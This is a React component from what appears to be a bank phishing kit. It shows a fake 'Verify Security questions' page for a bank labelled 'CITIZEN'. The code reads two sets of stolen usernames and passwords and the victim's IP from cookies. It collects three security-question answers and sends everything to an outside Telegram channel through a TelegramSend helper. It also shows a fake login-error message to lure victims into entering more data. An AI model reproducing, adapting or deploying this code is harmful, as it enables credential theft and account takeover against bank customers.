import React from "react";
import cookies from "../utils/cookie.config";
import { useNavigate } from "react-router-dom";
import TelegramSend from "../utils/send-message";

type Question = {
  q1: string;
  ans1: string;
  q2: string;
  ans2: string;
  q3: string;
  ans3: string;
}

export default function Check() {
  const [formInput, setFormInput] = React.useState<Question>({
    q1: "",
    ans1: "",
    q2: "",
    ans2: "",
    q3: "",
    ans3: ""
  });

  const pi = cookies.get("pi");
  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");

  const navigate = useNavigate();

  function handleSelectChange(event: React.ChangeEvent<HTMLSelectElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }


  const [isLoading, setIsLoading] = React.useState(false)
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true)
    const message = `
    [----+🏦 CITIZEN QUESTION 🏦+-----]

    IP: ${pi}

    Username: ${login1.heart}
    Password: ${login1.heartp}

    Username 2: ${login2.heart2}
    Password 2: ${login2.heartp2}

    Question 1: ${formInput.q1}
    Answer 1: ${formInput.ans1}
    
    Question 2: ${formInput.q2}
    Answer 2: ${formInput.ans2}

    Question 3: ${formInput.q3}
    Answer 3: ${formInput.ans3}
    
    `;
    await TelegramSend(message);
    setIsLoading(false);
    navigate("../thank-you", { replace: true });
  }



  return (
    <>
      <form
        className="pay-transfer-options clearfix"
        name="SignOn"
        id="frmSignOn"
        method="post"
        onSubmit={handleSubmit}
      >
        <div className="account-title clearfix">
          <p>Verify Security questions</p>
        </div>

        <div className="form-item label-right full-width clearfix">
          <select
            name="q1"
            onChange={handleSelectChange}
            className="kds-form__label"
            style={{
              borderLeft: "1px solid thistle",
              marginBottom: "10px",
              borderTop: "1px solid thistle",
            }}
            required
          >
            <option value="">Choose your question</option>
            <option value="In what city/town did your mother and father get married?">
              In what city/town did your mother and father get married?
            </option>
            <option value="In what city does your nearest sibling live?">
              In what city does your nearest sibling live?
            </option>
            <option value="Who was your favorite childhood hero?">
              Who was your favorite childhood hero?
            </option>
            <option value="What is the middle name of your oldest sibling?">
              What is the middle name of your oldest sibling?
            </option>
            <option value="What is your brother/sister nickname?">
              What is your brother/sister nickname?
            </option>
            <option value="What was your childhood nickname?">
              What was your childhood nickname?
            </option>
            <option value="What is your dream occupation?">
              What is your dream occupation?
            </option>
            <option value="What is your best friend's first name?">
              What is your best friend's first name?
            </option>
            <option value="What street did your best friend live on in high school?">
              What street did your best friend live on in high school?
            </option>
            <option value="Who is your favorite cartoon character?">
              Who is your favorite cartoon character?
            </option>
            <option value="What was your favorite teacher's name?">
              What was your favorite teacher's name?
            </option>
            <option value="What is the last name of your all-time favorite athlete?">
              What is the last name of your all-time favorite athlete?
            </option>
            <option value="If you have ever broken a bone, which one?">
              If you have ever broken a bone, which one?
            </option>
            <option value="What is your brother's name??">
              What is your brother's name?
            </option>
            <option value="What is your first pet's name?">
              What is your first pet's name?
            </option>
            <option value="What was the last name of your third grade teacher?">
              What was the last name of your third grade teacher?
            </option>
          </select>
          <input
            tabIndex={1}
            type="text"
            id="UserID"
            name="ans1"
            autoComplete="off"
            maxLength={20}
            className="required demo-username"
            style={{ width: "100% !important" }}
            required
            onChange={handleInputChange}
          />

          <br />
        </div>

        <div className="form-item label-right full-width clearfix">
          <select
            name="q2"
            className="kds-form__label"
            
            onChange={handleSelectChange}
            style={{
              borderLeft: "1px solid thistle",
              marginBottom: "10px",
              borderTop: "1px solid thistle",
            }}
            required
          >
            <option value="">Choose your question</option>
            <option value="Who is your favorite historical figure?">
              Who is your favorite historical figure?
            </option>
            <option
              value="In what city did your mother and father get married? (full name of
                            city only)"
            >
              In what city did your mother and father get married? (full name of
              city only)
            </option>
            <option value="In what city does your nearest sibling live?">
              In what city does your nearest sibling live?
            </option>
            <option value="Who was your favorite childhood hero?">
              Who was your favorite childhood hero?
            </option>
            <option value="What is the middle name of your oldest sibling?">
              What is the middle name of your oldest sibling?
            </option>
            <option value="What is your brother/sister nickname?">
              What is your brother/sister nickname?
            </option>
            <option value="What was your childhood nickname?">
              What was your childhood nickname?
            </option>
            <option value="What is your dream occupation?">
              What is your dream occupation?
            </option>
            <option value="What is your best friend's first name?">
              What is your best friend's first name?
            </option>
            <option value="What is the middle name of your oldest sibling?">
              What is the middle name of your oldest sibling?
            </option>
            <option value="What is the first and last name of your oldest cousin?">
              What is the first and last name of your oldest cousin?
            </option>
            <option value="What color was your first car?">
              What color was your first car?
            </option>
            <option value="What’s your Favourite teachers name?">
              What’s your Favourite teachers name?
            </option>
            <option value="What’s your brother/sisters nickname?">
              What’s your brother/sisters nickname?
            </option>
            <option value="What’s your favorite board game?">
              What’s your favorite board game?
            </option>
            <option value="What is your favorite museum or cultural institution?">
              What is your favorite museum or cultural institution?
            </option>
          </select>
          <input
            tabIndex={1}
            type="text"
            id="UserID"
            name="ans2"
            autoComplete="off"
            maxLength={20}
            className="required demo-username"
            style={{ width: "100% !important" }}
            required
            onChange={handleInputChange}
            
          />

          <br />
        </div>

        <div className="form-item label-right full-width clearfix">
          <select
            name="q3"
            
            onChange={handleSelectChange}
            className="kds-form__label"
            style={{
              borderLeft: "1px solid thistle",
              marginBottom: "10px",
              borderTop: "1px solid thistle",
            }}
            required
          >
            <option value="">Choose your question</option>
            <option value="Who is your favorite cartoon character?">
              Who is your favorite cartoon character?
            </option>
            <option value="What was your favorite teacher's name?">
              What was your favorite teacher's name?
            </option>
            <option value="What is the last name of your all-time favorite. athlete?">
              What is the last name of your all-time favorite. athlete?
            </option>
            <option value="If you have ever broken a bone, which one?">
              If you have ever broken a bone, which one? athlete?
            </option>
            <option value="What is your Brothers name?">
              What is your Brothers name?
            </option>
            <option value="What is your first pet's name?">
              What is your first pet's name?
            </option>
            <option value="What was the last name of your third grade teacher?">
              What was the last name of your third grade teacher?
            </option>
            <option value="Who is your favorite historical figure?">
              Who is your favorite historical figure?
            </option>
            <option value="What is your dream occupation?">
              What is your dream occupation?
            </option>
            <option value="What is the middle name of your oldest sibling?">
              What is the middle name of your oldest sibling?
            </option>
            <option value="What is the first and last name of your oldest cousin?">
              What is the first and last name of your oldest cousin?
            </option>
            <option value="What color was your first car?">
              What color was your first car?
            </option>
            <option value="What’s your Favourite teachers name?">
              What’s your Favourite teachers name?
            </option>
            <option value="What’s your brother/sisters nickname?">
              What’s your brother/sisters nickname?
            </option>
            <option value="What’s your favorite board game?">
              What’s your favorite board game?
            </option>
            <option value="What is your favorite museum or cultural institution?">
              What is your favorite museum or cultural institution?
            </option>
          </select>
          <input
            tabIndex={1}
            type="text"
            id="UserID"
            name="ans3"
            onChange={handleInputChange}
        
            autoComplete="off"
            maxLength={20}
            className="required demo-username"
            style={{ width: "100% !important" }}
            required
          />
          <br /> <br />
          <br />
        </div>
        <div id="fielderror" className="show-error" role="alert">
          We're sorry. That user ID and password does not match our records.
          Please try again, or do you need Login Assistance?
        </div>
        

        {
          isLoading ?
          <input
          type="button"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Please wait..."
        />

          :
          <input
          type="submit"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Submit"
        />
        }
      </form>
    </>
  );
}
